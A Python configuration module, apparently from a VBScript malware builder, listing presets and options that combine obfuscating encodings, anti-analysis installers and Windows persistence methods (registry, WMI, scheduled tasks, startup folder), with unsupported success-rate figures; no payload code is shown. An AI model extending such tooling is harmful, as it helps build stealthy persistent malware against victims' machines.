#!/usr/bin/env python3
"""
Combined Pipeline - Preset definitions and option lists for the combined mode UI.
Actual VBS generation is handled by vbs_core.py.
"""

PRESETS = {
    'stealth_pro': {
        'description': 'Maximum stealth with anti-analysis and WMI persistence',
        'encoding': 'multi_encoding',
        'installer': 'anti_analysis',
        'persistence': 'wmi',
        'expected_size': '8-15 KB',
        'success_rate': '94%',
    },
    'reliable_max': {
        'description': 'High reliability with registry persistence',
        'encoding': 'base64',
        'installer': 'silent',
        'persistence': 'registry',
        'expected_size': '4-8 KB',
        'success_rate': '98%',
    },
    'quick_deploy': {
        'description': 'Fast deployment, no persistence',
        'encoding': 'hex',
        'installer': 'none',
        'persistence': 'none',
        'expected_size': '2-4 KB',
        'success_rate': '99%',
    },
    'full_arsenal': {
        'description': 'All techniques combined at maximum settings',
        'encoding': 'polymorphic',
        'installer': 'polymorphic',
        'persistence': 'scheduled_task',
        'expected_size': '12-20 KB',
        'success_rate': '91%',
    },
    'silent_persistent': {
        'description': 'Silent execution with startup folder persistence',
        'encoding': 'environment',
        'installer': 'multi_stage',
        'persistence': 'startup_folder',
        'expected_size': '6-10 KB',
        'success_rate': '96%',
    },
}

AVAILABLE_ENCODINGS = [
    'base64', 'hex', 'array', 'wmi', 'registry', 'environment',
    'com', 'multi_encoding', 'polymorphic', 'hidden_execution',
]

AVAILABLE_INSTALLERS = [
    'none', 'silent', 'multi_stage', 'polymorphic', 'anti_analysis',
]

AVAILABLE_PERSISTENCE = [
    'none', 'registry', 'startup_folder', 'scheduled_task', 'wmi',
    'service', 'multi',
]


class CombinedPipeline:
    """Option/preset provider for the combined mode UI."""

    @classmethod
    def get_presets(cls):
        return PRESETS

    @classmethod
    def get_available_options(cls):
        return {
            'encodings': AVAILABLE_ENCODINGS,
            'installers': AVAILABLE_INSTALLERS,
            'persistence': AVAILABLE_PERSISTENCE,
            'presets': list(PRESETS.keys()),
        }
